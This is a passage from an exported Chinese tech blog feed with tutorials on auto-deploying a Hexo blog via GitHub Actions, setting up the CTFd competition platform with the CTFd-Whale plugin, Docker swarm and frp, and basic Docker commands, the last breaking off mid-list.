<h3 id="1-Github-创建仓库"><a href="#1-Github-创建仓库" class="headerlink" title="1. Github 创建仓库"></a>1. Github 创建仓库</h3><p>Github 创建两个仓库：</p>
<ul>
<li>一个 Public 仓库<ul>
<li>用于存放build后的博客静态网页</li>
<li>名称随意<ul>
<li>注意如果使用 <code>用户名.github.io</code> 为仓库名可以无需加仓库名路径访问</li>
<li>如果仓库名为 <code>blog</code>, 则需要通过 <code>用户名.github.io/blog</code> 访问</li>
<li>这里以 <code>ex7l0it.github.io</code> 为例</li>
</ul>
</li>
</ul>
</li>
<li>一个 Private 仓库<ul>
<li>用来存放文章源码</li>
<li>名称随意，以 <code>blog-source</code> 为例</li>
</ul>
</li>
</ul>
<p>实现目标是更新 Private 仓库数据时会使用 Github Actions 自动 build 博客内容并部署到指定的 Public 仓库中</p>
<h3 id="2-创建-Github-Token"><a href="#2-创建-Github-Token" class="headerlink" title="2. 创建 Github Token"></a>2. 创建 Github Token</h3><ul>
<li>如何创建? <ul>
<li>答: 看<a href="https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens#creating-a-fine-grained-personal-access-token">官方文档</a></li>
<li>创建一个 Token, 用新的细粒度的 <code>Fine-grained personal access tokens</code></li>
<li><code>Token name</code> 内容随意, 自己知道用于自动化部署博客即可</li>
<li><del>Select scopes 部分选择 <code>repo</code> 和 <code>workflow</code> 权限</del></li>
<li>Repository access 选中 <code>Only select repositories</code>，选择公开仓库 <code>ex7l0it.github.io</code><ul>
<li>仓库权限中给 <code>Actions</code>、<code>Contents</code>、<code>Pages</code> 分配 <code>Read and write</code> 权限就够</li>
<li>无需账号权限</li>
</ul>
</li>
</ul>
</li>
<li>注意 <ul>
<li>Token 创建完成后只显示一次, 及时复制</li>
<li>Token 有过期时间, 过期之后记得再次更新(当然这是后话)</li>
</ul>
</li>
</ul>
<h3 id="3-为-Private-仓库创建-secrets"><a href="#3-为-Private-仓库创建-secrets" class="headerlink" title="3. 为 Private 仓库创建 secrets"></a>3. 为 Private 仓库创建 secrets</h3><ul>
<li>如何创建?<ul>
<li>答: 还是看<a href="https://docs.github.com/en/actions/security-guides/encrypted-secrets#creating-encrypted-secrets-for-a-repository">官方文档</a></li>
<li>Name 还是随意, 这里以 <code>DEPLOY_TOKEN</code> 为例</li>
<li>Secret 内容填写上一步生成的 Token</li>
</ul>
</li>
</ul>
<h3 id="4-创建-Github-Actions-配置文件"><a href="#4-创建-Github-Actions-配置文件" class="headerlink" title="4. 创建 Github Actions 配置文件"></a>4. 创建 Github Actions 配置文件</h3><ol>
<li>在 hexo 项目根目录的 <code>.github</code> 文件夹下创建一个名为 <code>workflows</code> 的文件夹</li>
<li>在刚刚创建的 <code>workflows</code> 文件夹下创建一个 <code>.yml</code> 类型文件，名称随意，这里以 <code>deploy.yml</code> 为例</li>
<li><code>deploy.yml</code> 内容大致如下:</li>
</ol>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">Deploy</span> <span class="string">GitHub</span> <span class="string">Pages</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="comment"># 只有当 master 分支进行 push 的时候执行下面的操作 (也就是当前Private仓库的分支)</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">master</span> </span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build-and-deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    </span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/checkout@master</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Build</span> <span class="string">and</span> <span class="string">Deploy</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">theme-keep/hexo-deploy-github-pages-action@master</span></span><br><span class="line">      <span class="attr">env:</span></span><br><span class="line">        <span class="comment"># 这里注意 DEPLOY_TOKEN 是上一步设置的 secrets 名称</span></span><br><span class="line">        <span class="attr">PERSONAL_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.DEPLOY_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># The repository the action should deploy to.</span></span><br><span class="line">        <span class="comment"># 这里是部署的目标仓库, 格式是Github用户名/一开始创建的 public 仓库名</span></span><br><span class="line">        <span class="attr">PUBLISH_REPOSITORY:</span> <span class="string">ex7l0it/ex7l0it.github.io</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># The branch the action should deploy to.</span></span><br><span class="line">        <span class="comment"># 要部署到的 public 仓库的分支名</span></span><br><span class="line">        <span class="attr">BRANCH:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<p>这里使用的是 <code>theme-keep</code> 团队创建的 <a href="https://github.com/theme-keep/hexo-deploy-github-pages-action">https://github.com/theme-keep/hexo-deploy-github-pages-action</a> 仓库中的内容，Hexo博客通用, 不局限主题 👍🏻👍🏻👍🏻</p>
<blockquote>
<p>杂七杂八的话</p>
<ul>
<li>现在 Github 默认分支改成了main, 本人还是习惯用 master(可以在Github设置中更改默认分支名称)</li>
<li>如果需要将本地的 main 分支改名为 master 分支, 执行 <code>git branch -m main master</code> 即可</li>
</ul>
</blockquote>
<h3 id="5-完成"><a href="#5-完成" class="headerlink" title="5. 完成"></a>5. 完成</h3><ul>
<li>将 hexo 项目 push 到 Private 仓库即可触发自动化部署，可以在仓库的 Actions 页面看到 Workflows 的工作状态</li>
<li>Public 仓库中通过 Github Pages 访问即可</li>
</ul>
<h3 id="6-其他的好东西"><a href="#6-其他的好东西" class="headerlink" title="6. 其他的好东西"></a>6. 其他的好东西</h3><ul>
<li>扒拉半天才找到的能用的 <a href="https://u.sb/css-cdn/">前端 CDNJS 库及 Google Fonts、Ajax 和 Gravatar 国内加速服务</a>，可以用来修改主题默认字体</li>
</ul>
]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFd + CTFd_Whale 部署</title>
    <url>/2023/08/18/ctfd/</url>
    <content><![CDATA[<p>以下内容基于 frankli0324 师傅的这篇 <a href="https://github.com/frankli0324/ctfd-whale/blob/master/docs/install.zh-cn.md">ctfd-whale 使用指南</a> 修改</p>
<ul>
<li>一切都使用最新的(截止文章发布时)</li>
</ul>
<h1 id="手动安装部署-CTFd"><a href="#手动安装部署-CTFd" class="headerlink" title="手动安装部署 CTFd"></a>手动安装部署 CTFd</h1><h2 id="从零开始-👉-安装配置-Docker"><a href="#从零开始-👉-安装配置-Docker" class="headerlink" title="从零开始 👉 安装配置 Docker"></a>从零开始 👉 安装配置 Docker</h2><blockquote>
<p>系统环境: 刚初始化安装后的 Ubuntu 20.04 LTS</p>
</blockquote>
<p>直接按照 Docker 官方文档操作 👉 <a href="https://docs.docker.com/engine/install/ubuntu/">https://docs.docker.com/engine/install/ubuntu/</a></p>
<details class="note info"><summary><p>懒得去看文档直接执行这里的命令</p>
</summary>
<ul>
<li>这里的内容在以后可能会失效，一些还是以官方文档为准</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update </span><br><span class="line">sudo apt install ca-certificates curl gnupg -y</span><br><span class="line">sudo install -m 0755 -d /etc/apt/keyrings</span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg</span><br><span class="line">sudo chmod a+r /etc/apt/keyrings/docker.gpg</span><br><span class="line">echo \</span><br><span class="line">&quot;deb [arch=&quot;$(dpkg --print-architecture)&quot; signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \</span><br><span class="line">&quot;$(. /etc/os-release &amp;&amp; echo &quot;$VERSION_CODENAME&quot;)&quot; stable&quot; | \</span><br><span class="line">sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y</span><br></pre></td></tr></table></figure>

</details>

<p>安装完成 Docker 后将当前用户加入到 docker 组:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo usermod -aG docker $&#123;USER&#125;</span><br></pre></td></tr></table></figure>

<p>重新启动一个会话，然后就可以无需 sudo 执行 docker 命令了。接下来初始化一个 swarm 集群, 然后给节点标注名称</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker swarm init</span><br><span class="line">docker node update --label-add &quot;name=linux-1&quot; $(docker node ls -q)</span><br></pre></td></tr></table></figure>

<p>ctfd-whale 利用 <code>docker swarm</code> 的集群管理能力，能够将题目容器分发到不同的节点上运行。选手每次请求启动题目容器时，ctfd-whale 都将随机选择一个合适的节点运行这个题目容器。</p>
<p>注意，2.5.0+ 版本 CTFd 的 <code>docker-compose.yml</code> 中包含了一个 nginx 反代，占用了 80 端口</p>
<h2 id="部署-CTFd"><a href="#部署-CTFd" class="headerlink" title="部署 CTFd"></a>部署 CTFd</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/CTFd/CTFd --depth=1</span><br><span class="line">cd CTFd   # 注: 后续所有操作均在这个 CTFd 目录中 </span><br></pre></td></tr></table></figure>

<p>先修改 <code>docker-compose.yml</code> 文件，把第一行的 <code>version: &#39;2&#39;</code> 删掉，然后执行:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>

<p>等待启动完毕后访问 8000 端口，对 CTFd 进行初始化配置</p>
<h2 id="配置-frps"><a href="#配置-frps" class="headerlink" title="配置 frps"></a>配置 frps</h2><p>修改 <code>docker-compose.yml</code>，往里面添加一个 <code>frp_connect</code> 网络用于 frps 与 frpc 之间的通信，然后添加 frps service：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line">  <span class="attr">frps:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">glzjin/frp</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./conf/frp:/conf</span></span><br><span class="line">    <span class="attr">entrypoint:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/usr/local/bin/frps</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/conf/frps.ini</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">10000</span><span class="number">-10100</span><span class="string">:10000-10100</span>   <span class="comment"># 映射direct类型题目的端口</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8001</span><span class="string">:8001</span>                 <span class="comment"># 映射http类型题目的端口</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">default:</span>                    <span class="comment"># 需要将frps暴露到公网以正常访问题目容器</span></span><br><span class="line">      <span class="attr">frp_connect:</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line">  <span class="attr">frp_connect:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">overlay</span></span><br><span class="line">    <span class="attr">internal:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">attachable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">172.1</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>创建 frp 的配置文件目录: <code>./conf/frp</code>:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir ./conf/frp</span><br></pre></td></tr></table></figure>

<p>创建 frpc 配置文件：<code>./conf/frp/frpc.ini</code>, 填写下面的内容(注释中的内容全部删掉, 不然会导致配置文件解析错误无法正常启动 frpc 服务): </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下面两个端口注意不要与direct类型题目端口范围重合</span></span><br><span class="line">bind_port = 7987        # frpc 连接到 frps 的端口</span><br><span class="line">vhost_http_port = 8001  # frps 映射http类型题目的端口</span><br><span class="line">token = your_token      # 填写一个随机的字符串即可</span><br><span class="line">subdomain_host = welcome.blue-whale.me  # 访问http题目容器的主机名</span><br></pre></td></tr></table></figure>

<h2 id="配置-frpc"><a href="#配置-frpc" class="headerlink" title="配置 frpc"></a>配置 frpc</h2><p>同样的操作，再添加一个网络，用于 frpc 与题目容器之间进行通信，并添加 frpc service:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line">  <span class="attr">frps:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">glzjin/frp</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./conf/frp:/conf</span></span><br><span class="line">    <span class="attr">entrypoint:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/usr/local/bin/frpc</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/conf/frpc.ini</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">frps</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="attr">frp_containers:</span></span><br><span class="line">      <span class="attr">frp_connect:</span> <span class="comment"># 供 frpc 访问 frps</span></span><br><span class="line"></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line">  <span class="attr">frp_containers:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">overlay</span></span><br><span class="line">    <span class="attr">internal:</span> <span class="literal">true</span>    <span class="comment"># 如果允许题目容器访问外网，则可以去掉这一行</span></span><br><span class="line">    <span class="attr">attachable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">subnet:</span> <span class="number">172.2</span><span class="number">.0</span><span class="number">.0</span><span class="string">/16</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同样的，创建 frpc 的配置文件： <code>./conf/frp/frpc.ini</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">token = your_token   # 与 frps.ini 中一致的token</span><br><span class="line">server_addr = frps</span><br><span class="line">server_port = 7987   # 对应 frps.ini 中的 bind_port</span><br><span class="line">admin_addr = frpc</span><br><span class="line">admin_port = 7400</span><br></pre></td></tr></table></figure>

<h2 id="检查-frp-配置"><a href="#检查-frp-配置" class="headerlink" title="检查 frp 配置"></a>检查 frp 配置</h2><p>执行 <code>docker compose up -d</code> 更新 compose 配置</p>
<ul>
<li>可以通过查看日志检查服务状态:</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ctf@welcome-blue-whale-ctfd:~/CTFd$ docker compose logs frps</span><br><span class="line">ctfd-frps-1  | 2023/08/19 05:19:07 [I] [service.go:146] frps tcp listen on 0.0.0.0:7987</span><br><span class="line">ctfd-frps-1  | 2023/08/19 05:19:07 [I] [service.go:188] http service listen on 0.0.0.0:48100</span><br><span class="line">ctfd-frps-1  | 2023/08/19 05:19:07 [I] [root.go:204] Start frps success</span><br><span class="line">ctfd-frps-1  | 2023/08/19 05:19:08 [I] [service.go:356] client login info: ip [172.1.0.4:39176] version [0.28.2] hostname [] os [linux] arch [amd64]</span><br><span class="line">ctf@welcome-blue-whale-ctfd:~/CTFd$ docker compose logs frpc</span><br><span class="line">ctfd-frpc-1  | 2023/08/19 05:19:08 [I] [service.go:224] login to server success, get run id [e626881d0ed6c1db], server udp port [0]</span><br><span class="line">ctfd-frpc-1  | 2023/08/19 05:19:08 [I] [service.go:109] admin server listen on frpc:7400</span><br></pre></td></tr></table></figure>

<ul>
<li>如果是类似上面这样的输出那么说明 frpc 和 frps 配置及服务正常</li>
</ul>
<details class="note warning"><summary><p>😅遇到的坑</p>
</summary>
<ul>
<li>🔴 坑1: 遇到 <code>Cannot start service frpc: attaching to network failed, make sure your network options are correct and check manager logs: context deadline exceeded</code> 报错<ul>
<li>先前是固定写死的 frpc 容器的IP地址, 指定了 <code>172.1.0.3</code>, 然后 <code>docker compose up -d</code> 时遇到 <code>attaching to network failed</code> 错误</li>
<li>解决方案: 换了其他的 IP 就可以用了，或者像现在这样删掉指定的 IP，自动分配即可</li>
<li>错误原因: 未知<ul>
<li>并没有发现有其他的容器占用了 172.1.0.3 这个 IP 地址</li>
</ul>
</li>
</ul>
</li>
</ul>

</details>


<h2 id="配置-CTFd-👉-安装-ctfd-whale"><a href="#配置-CTFd-👉-安装-ctfd-whale" class="headerlink" title="配置 CTFd 👉 安装 ctfd-whale"></a>配置 CTFd 👉 安装 ctfd-whale</h2><p>frp 服务正常工作后，把本机 docker 的访问接口映射到 CTFd 容器中，并将 CTFd 加入到 frpc 所在的 network 中(frpc_connect)：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line">  <span class="attr">ctfd:</span></span><br><span class="line">    <span class="string">...</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="string">...</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run/docker.sock:/var/run/docker.sock</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="string">...</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">frpc</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="string">...</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">frp_connect:</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将 CTFd-Whale 克隆至 CTFd 的插件目录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/frankli0324/CTFd-Whale CTFd/plugins/ctfd-whale --depth=1</span><br></pre></td></tr></table></figure>

<p>重新 build CTFd 的镜像, 更新 compose 配置:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker compose build</span><br><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>

<p>管理员登录 CTFd, 进入后台, 右上角可以看到 Whale 插件的配置入口</p>
<ul>
<li>首先配置 Docker 配置选项:<ul>
<li><code>Auto Connect Network</code> 中填写: <code>ctfd_frp_containers</code></li>
<li>点击 Submit 保存配置</li>
</ul>
</li>
<li>然后进入 Router 配置选项检查 frp 配置:<ul>
<li><code>Http Domain Suffix</code> 与之前 <code>frps.ini</code> 中的 <code>subdomain_host</code> 保持一致</li>
<li><code>External Http Port</code> 与之前 <code>frps.ini</code> 中的 <code>vhost_http_port</code> 保持一致</li>
<li><code>Direct IP Address</code> 填写能够访问到 frps 中指定端口的 IP（以 Direct 方式生成的题目将显示该 IP 和随机使用的端口号）</li>
<li><code>Direct Minimum Port</code> 和 <code>Direct Maximum Port</code> 对应 <code>docker-compose.yml</code> 中 frps 配置的端口范围</li>
</ul>
</li>
</ul>
<p>到目前为止，CTFd-Whale 已经可以正常使用了</p>
<h2 id="配置-Nginx"><a href="#配置-Nginx" class="headerlink" title="配置 Nginx"></a>配置 Nginx</h2><p>TODO</p>
]]></content>
      <tags>
        <tag>Tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 的使用</title>
    <url>/2023/08/03/docker/</url>
    <content><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><blockquote>
<p>练习环境：<a href="https://www.docker.com/play-with-docker/">https://www.docker.com/play-with-docker/</a><br>官方入门文档: <a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a><br>学习资料：<a href="https://yeasy.gitbook.io/docker_practice/">https://yeasy.gitbook.io/docker_practice/</a></p>
</blockquote>
<p>想要从零开始学习 Docker 可以直接看上面👆这些资料，下面只整理一些基本的常用命令</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
<li>Docker 是一个开源的应用容器引擎。</li>
<li>Docker 是一种容器技术，解决软件跨环境迁移的问题，Docker 容器与虚拟机类似，但是原理不同，容器是将操作系统层虚拟化，而虚拟机是硬件虚拟化</li>
</ul>
<p>三个基本概念：</p>
<ul>
<li><a href="https://yeasy.gitbook.io/docker_practice/basic_concept/image">镜像（Image）</a></li>
<li><a href="https://yeasy.gitbook.io/docker_practice/basic_concept/container">容器（Container）</a></li>
<li><a href="https://yeasy.gitbook.io/docker_practice/basic_concept/repository">仓库（Repository）</a></li>
</ul>
<h2 id="安装与配置"><a href="#安装与配置" class="headerlink" title="安装与配置"></a>安装与配置</h2><ul>
<li>请查看官方文档 👉 <a href="https://docs.docker.com/engine/install/">https://docs.docker.com/engine/install/</a></li>
</ul>
<h3 id="镜像加速"><a href="#镜像加速" class="headerlink" title="镜像加速"></a>镜像加速</h3><ul>
<li>使用阿里云的镜像加速器 👉 <a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors</a></li>
</ul>
<h3 id="代理配置"><a href="#代理配置" class="headerlink" title="代理配置"></a>代理配置</h3><ul>
<li>查看官方文档 👉 <a href="https://docs.docker.com/config/daemon/systemd/">https://docs.docker.com/config/daemon/systemd/</a></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">mkdir</span> -p /etc/systemd/system/docker.service.d</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim /etc/systemd/system/docker.service.d/http-proxy.conf</span></span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Environment=&quot;HTTP_PROXY=http://proxy.example.com:80&quot;</span><br><span class="line">Environment=&quot;HTTPS_PROXY=https://proxy.example.com:443&quot;</span><br></pre></td></tr></table></figure>

<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><h3 id="镜像相关命令"><a href="#镜像相关命令" class="headerlink" title="镜像相关命令"></a>镜像相关命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker images           <span class="comment"># 查看现有镜像</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker search redis     <span class="comment"># 搜索镜像(例如redis)</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker pull redis:5.0   <span class="comment"># 拉取镜像, 不指定镜像仓库地址则从docker.io获取镜像, 不指定tag则默认是:latest</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker rmi cefde848bd49 <span class="comment"># 删除镜像(可以指定镜像ID或镜像名称, 镜像ID取前几位能区分开就行)</span></span></span><br></pre></td></tr></table></figure>

<h3 id="容器相关命令"><a href="#容器相关命令" class="headerlink" title="容器相关命令"></a>容器相关命令</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例如下面这个命令:</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run --name=c1 -idp 8000:80 -v /var/www/html:/web ubuntu:20.04</span></span><br></pre></td></tr></table></figure>
<ul>
<li>基于 <code>ubuntu:20.04</code> 镜像以守护进程方式启动一个容器，并保持 <code>STDIN</code> 打开，将该容器命名为 <code>c1</code>，把容器内部 <code>80</code> 端口映射到本地 <code>8000</code> 端口，并将本地的 <code>/var/www/html</code> 目录映射到容器内部 <code>/web</code> 目录</li>
<li>镜像名后面可指定启动容器后需要执行的命令，不加的话则是默认调用容器在 <code>build</code> 时 <code>Dockerfile</code> 中 <code>CMD</code> 命令指定的</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前运行中的容器</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker ps</span> </span><br><span class="line">CONTAINER ID   IMAGE          COMMAND   CREATED          STATUS          PORTS                                   NAMES</span><br><span class="line">7406d13e9fe2   ubuntu:20.04   &quot;bash&quot;    19 seconds ago   Up 18 seconds   0.0.0.0:8000-&gt;80/tcp, :::8000-&gt;80/tcp   c1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入c1容器</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker <span class="built_in">exec</span> -it c1 /bin/bash</span> </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>flag</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>-i</code></td>
<td>标准输入保持打开(交互式运行容器)</td>
</tr>
<tr>
<td><code>-t</code></td>
<td>分配一个pseudo-tty(伪终端)</td>
</tr>
<tr>
<td><code>-d</code></td>
<td>分离模式，也就是在后台启动容器</td>
</tr>
<tr>
<td><code>--name</code></td>
<td>指定容器名称</td>
</tr>
<tr>
<td><code>-v 宿主机目录(文件):容器内目录(文件)</code></td>
<td>将宿主机的目录挂载到容器中</td>
</tr>
<tr>
<td><code>-p 宿主机端口号:容器端口号</code></td>
<td>将容器端口映射到宿主机中</td>
</tr>
<tr>
<td><code>-P</code></td>
<td>自动将 Dockerfile 中使用 EXPOSE 命令暴露的端口随机映射出来</td>
</tr>
<tr>
<td><code>--rm</code></td>
<td>当容器退出时自动删除</td>
</tr>
<tr>
<td><code>-e</code></td>
<td>指定容器内部的环境变量</td>
</tr>
<tr>
<td><code>--network</code></td>
<td>指定容器使用的网络</td>
</tr>
</tbody></table>
<p>更多的flags参考<a href="https://docs.docker.com/engine/reference/run/">官方文档</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker ps                    <span class="comment"># 查看正在运行的容器</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker ps -a                 <span class="comment"># 查看所有容器</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker stop c2               <span class="comment"># 停止容器(根据CONTAINER ID或NAMES指定)</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker <span class="built_in">rm</span> c1                 <span class="comment"># 删除容器(可使用容器ID或容器名称)</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker <span class="built_in">rm</span> -f                 <span class="comment"># 强制删除容器(自动停止并删除)</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker <span class="built_in">rm</span> `docker ps -aq`    <span class="comment"># 删除所有容器</span></span></span><br></pre></td></tr></table></figure>

<h3 id="数据卷操作"><a href="#数据卷操作" class="headerlink" title="数据卷操作"></a>数据卷操作</h3><details class="note success"><summary><p>📌 <strong>数据卷</strong>与<strong>目录挂载</strong>的区别是什么?</p>
</summary>
<ul>
<li>Named volumes<ul>
<li>数据卷存放位置由 Docker 统一管理</li>
<li>在初始化时使用容器内容填充空卷</li>
</ul>
</li>
<li>Bind mounts<ul>
<li>目录由用户自行指定</li>
<li>初始化时不会使用容器内容填充空目录</li>
</ul>
</li>
</ul>

</details>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker volume create vol-demo  <span class="comment"># 创建一个名为 vol-demo 的数据卷</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker volume <span class="built_in">ls</span>               <span class="comment"># 查看所有的数据卷</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker volume inspect vol-demo <span class="comment"># 查看 vol-demo 数据卷的信息</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker volume <span class="built_in">rm</span> vol-demo      <span class="comment"># 删除 vol-demo 数据卷</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker volume prune            <span class="comment"># 删除无主数据</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">docker run -d -P --name web --mount <span class="built_in">source</span>=vol-demo,target=/web nginx <span class="comment"># 挂载数据卷</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>当容器目录和数据卷目录绑定后，两边的修改会立即同步</li>
<li>一个数据卷可以被多个容器同时挂载</li>
<li>一个容器也可以被挂载多个数据卷</li>
<li>容器删除后，数据卷仍然存在</li>
</ul>
<h4 id="mount-与-v"><a href="#mount-与-v" class="headerlink" title="--mount 与 -v"></a><code>--mount</code> 与 <code>-v</code></h4><ul>
<li><code>-v</code> 前面已经提到了，可以将本地目录挂载到容器当中<ul>
<li><code>-v 宿主机目录:容器内目录</code></li>
</ul>
</li>
<li><code>--mount</code> 相比 <code>-v</code> 来说功能更多，可以更加精准的控制挂载的内容<ul>
<li>例如挂载类型、读写权限等<ul>
<li>挂载类型通过 <code>type</code> 指定</li>
<li>源目录或卷通过 <code>src</code> 或 <code>source</code> 指定</li>
